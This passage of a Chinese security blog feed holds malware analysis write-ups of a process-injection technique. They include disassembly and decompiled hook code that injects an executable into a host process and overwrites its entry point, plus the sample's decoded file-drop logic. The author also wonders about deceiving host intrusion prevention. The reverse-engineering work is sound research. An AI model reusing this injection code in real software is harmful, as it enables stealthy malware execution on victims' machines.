&lt;p&gt;想着就在这把文件dump出来，在ida中看方便点，然后再od中下断，为了怕跑飞，也对CreateProcessA下断了，然后运行，现在CreateProcessA中断下来，回溯了一下，看着堆栈栈帧很少，就尝试看能够脱壳不&lt;br&gt;很笨的下断回溯了两次，到了00402C5B ，一点都不想c入口，但是上次没有，调用地址是0012FFC4   7C817067  返回到 kernel32.7C817067&lt;br&gt;也不像是壳进行了入口的patch，将就吧，dump出来，importrect修复了一下，嘿，在ida中一看，还不错，入口代码这样的：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;00402C5B    68 00040000     push 0x400&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C60    68 D0DF4000     push DesktopL.0040DFD0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C65    E8 AEEAFFFF     call DesktopL.00401718&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C6A    83F8 01         cmp eax,0x1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C6D    75 70           jnz short DesktopL.00402CDF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C6F    68 00404000     push DesktopL.00404000                                            ; ASCII &amp;quot;KyUffThOkYwRRtgPP&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402C74    E8 66EAFFFF     call DesktopL.004016DF&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;马上定位到image00400000+0x2a59，修复的还不错，这下子方便多了，可以直接f5，但是不能正常执行&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;__int64 __stdcall myHookZwWriteVirtualMemory(HANDLE hProcess, int a2, int a3, int a4, int a5) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LODWORD(v5) = mySysZwWriteVirtualMemory(hProcess, a2, a3, a4, a5, NumberOfBytesWritten, flOldProtect, v12);// 调用原函数 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NumberOfBytesWritten = (SIZE_T)&amp;amp;v12;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;v9 = v5;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( hProcess != (HANDLE)-1 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( !myInjectFlag )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( !lpAddress ) // 初始化为0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;EOP = (void *)myGetEOP(hProcess); // 获取到宿主进程EOP&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( EOP )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;myInjectFlag = 1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;lpAddress = EOP;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dword_40DFA8 = myInjectMyExe(hProcess, (int)&amp;quot;MZ, 0x9800u);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dword_40DFAD = v7;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( dword_40DFA8 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;VirtualProtectEx(hProcess, lpAddress, 0xCu, 0x40u, &amp;amp;flOldProtect);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WriteProcessMemory(hProcess, lpAddress, &amp;amp;byte_40DFA7, 0xCu, &amp;amp;NumberOfBytesWritten); //入口感染&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;VirtualProtectEx(hProcess, lpAddress, 0xCu, flOldProtect, &amp;amp;flOldProtect);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;return v9;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在钩子函数中，工作很少，获取到宿主进程EOP，在宿主进程中加载自己的程序，然后对EOP进行感染，也就是跳转到自己的程序代码空间&lt;br&gt;代码基本就这么多了，最后怎么玩就靠自己的代码了。&lt;/p&gt;
&lt;h1 id=&quot;3-技术总结&quot;&gt;&lt;a href=&quot;#3-技术总结&quot; class=&quot;headerlink&quot; title=&quot;3. 技术总结&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 技术总结&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;其实和另一个中注入方式大同小异，目标都是为了将自己的程序映射到宿主进程空间中。&lt;br&gt;一个直接暴力suspend，读写，另一个在创建进程过程中进行读写。&lt;br&gt;由于两种方式都有远程进程读写操作，都应该会被主防拦住，貌似现在效果也不是很好了&lt;br&gt;是否可以再读写内存时，对主防进行欺骗呢，还需要研究….&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-来源&quot;&gt;&lt;a href=&quot;#1-来源&quot; class=&quot;headerlink&quot; title=&quot;1. 来源&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 来源&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。&lt;br&gt;前面分析了一种进程注入方法，现在开始分析另外一种貌似更猥琐的方式，貌似说这种技术用在ramnit病毒中，下面这图是大致原理图（&lt;a href=&quot;http://www.pctrojan.com/content/723-virus-blocks-itself&quot;&gt;引用的&lt;/a&gt;）&lt;br&gt;
    
    </summary>
    
      <category term="security" scheme="http://anhkgg.github.io/categories/security/"/>
    
    
      <category term="inject process" scheme="http://anhkgg.github.io/tags/inject-process/"/>
    
      <category term="reverse" scheme="http://anhkgg.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>inject process analyze and code</title>
    <link href="http://anhkgg.github.io/inject-process-analyze-and-code/"/>
    <id>http://anhkgg.github.io/inject-process-analyze-and-code/</id>
    <published>2014-11-25T09:45:00.000Z</published>
    <updated>2016-07-07T15:17:29.010Z</updated>
    
    <content type="html">&lt;h1 id=&quot;1-起因&quot;&gt;&lt;a href=&quot;#1-起因&quot; class=&quot;headerlink&quot; title=&quot;1. 起因&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 起因&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。&lt;br&gt;某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;2-分析与实现&quot;&gt;&lt;a href=&quot;#2-分析与实现&quot; class=&quot;headerlink&quot; title=&quot;2. 分析与实现&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. 分析与实现&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;2-1-PEID&quot;&gt;&lt;a href=&quot;#2-1-PEID&quot; class=&quot;headerlink&quot; title=&quot;2.1 PEID&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.1 PEID&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;壳信息：Microsoft Visual C++ v6.0，无壳&lt;br&gt;文件名：bbs.exe&lt;br&gt;既然无壳，直接ida先分析一下，遇到无法分析的OD继续调试。&lt;/p&gt;
&lt;h2 id=&quot;2-2-分析&quot;&gt;&lt;a href=&quot;#2-2-分析&quot; class=&quot;headerlink&quot; title=&quot;2.2 分析&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.2 分析&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;打开IDA，拖入文件，找到主函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A720 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A720&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A720                 push    ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A721                 mov     ebp, esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A723                 push    ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A724                 call    sub_408BE0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A729                 mov     esp_4FEE68, esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A72F                 mov     esp_4FEE6C, ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A735                 call    sub_408929//主功能函数&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A73A                 mov     [ebp+var_4], eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A73D                 mov     eax, [ebp+var_4]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A740                 mov     esp, ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A742                 pop     ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A743                 retn    10h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040A743 _WinMain@16     endp&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;没什么东西，继续sub_408929：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:00408929 sub_408929      proc near               ; CODE XREF: WinMain(x,x,x,x)+15p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408929                 cld&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040892A                 fninit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040892C                 call    myNewObj&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408931                 push    offset sub_406C2A&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408936                 mov     eax, 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040893B                 call    myInitFunc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408940                 add     esp, 4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408943                 call    sub_40101D//这几个都是些无用函数，多半是花指令&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408948                 call    sub_406B84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040894D                 call    sub_406BDB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408952                 call    sub_401000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408957                 call    sub_406BBE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040895C                 call    sub_406BA1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408961                 call    sub_406BF8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408966                 call    myReleaseFile//文件释放，可能是功能文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040896B                 push    eax             ; uExitCode&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0040896C                 call    nullsub_1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408971                 call    j_myExit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408976                 add     esp, 4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408979                 retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:00408979 sub_408929      endp&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其他函数都没有什么重要的代码，接着看看myReleaseFile，代码太多，直接f5看看整体流程，结构：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __cdecl myReleaseFile()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  lpMem = &amp;quot;QzpcUHJvZ3JhbSBGaWxlc1xDb21tb24gRmlsZXNcTWljcm9zb2Z0IFNoYXJlZFxNU0luZm9ca2trLnR4dA==&amp;quot;;// C:\Program Files\Common Files\Microsoft Shared\MSInfo\kkk.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v12 = (void *)myBase64Dec(&amp;amp;lpMem);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( lpMem )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    j_myIsInMyImg(lpMem);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v1 = (int)v12;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( !v12 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v1 = (int)dword_416285;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  pszPath = (LPCSTR)myFormat(ebp0, 1, (unsigned int)v1, 0x80000005u);//  C:\Program Files\Common Files\Microsoft Shared\MSInfo\kkk.txt&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v2 = (int)v12;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( v12 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    j_myIsInMyImg(v12);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v10 = (int *)&amp;amp;v6;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v3 = PathFileExistsA(pszPath);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( (void **)v10 != &amp;amp;v6 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v3 = myRunError(v2, 6);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v9 = v3;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( pszPath )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    j_myIsInMyImg((void *)pszPath);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( v9 == 1 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    lpMem = &amp;quot;我是一个中国人&amp;quot;;//恩，很爱国&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v12 = &amp;quot;34,85,10,1D,04,D1,CF,42,DF,A4,B0,&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    pszPath = (LPCSTR)myDecStr(&amp;amp;v12, &amp;amp;lpMem);   // 字符串解密，&amp;quot;svchost.exe&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( v12 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j_myIsInMyImg(v12);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( lpMem )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j_myIsInMyImg(lpMem);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v4 = j_myNewBuf(ebp0, 0x10u);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v10 = (int *)v4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    *(_DWORD *)v4 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    *((_DWORD *)v4 + 1) = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    *((_DWORD *)v4 + 2) = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    *((_DWORD *)v4 + 3) = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v9 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v8 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v7 = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v6 = &amp;amp;unk_4162BE;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    myWork(&amp;amp;v6, &amp;amp;v7, 0, &amp;amp;pszPath, 1, 0, 0, 0, 0, &amp;amp;v10, 0);//注入进程的功能，代码中很多混淆&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( v6 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j_myIsInMyImg(v6);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( v7 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j_myIsInMyImg(v7);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( pszPath )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j_myIsInMyImg((void *)pszPath);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    j_myIsInMyImg(v10);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sub_40574F();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;由于在myWork中太多混淆，IDA无力，转战OD，看到高大上的进程注入。由于代码混淆，太多PE操作，而且IDA没有有效识别内存拷贝函数，给分析带来了较大困难。&lt;br&gt;下面是主要的进程注入用到的函数表，myWork中调用这些关键函数，都是通过该函数表调用，里面通过loaddll+getprocaddress获取到函数地址，返回，然后调用：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB87F myLocalSize1    dd offset myLocalSize   ; DATA XREF: .text:00402CACr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB883 myRtlMoveMemory1 dd offset myRtlMoveMemory ; DATA XREF: .text:00402F32r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB887 myLocalSize2    dd offset sub_4089DC    ; DATA XREF: .text:00403303r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB88B myRtlMoveMemory2 dd offset sub_4089F2   ; DATA XREF: .text:00403701r&lt;/div&gt;&lt;div 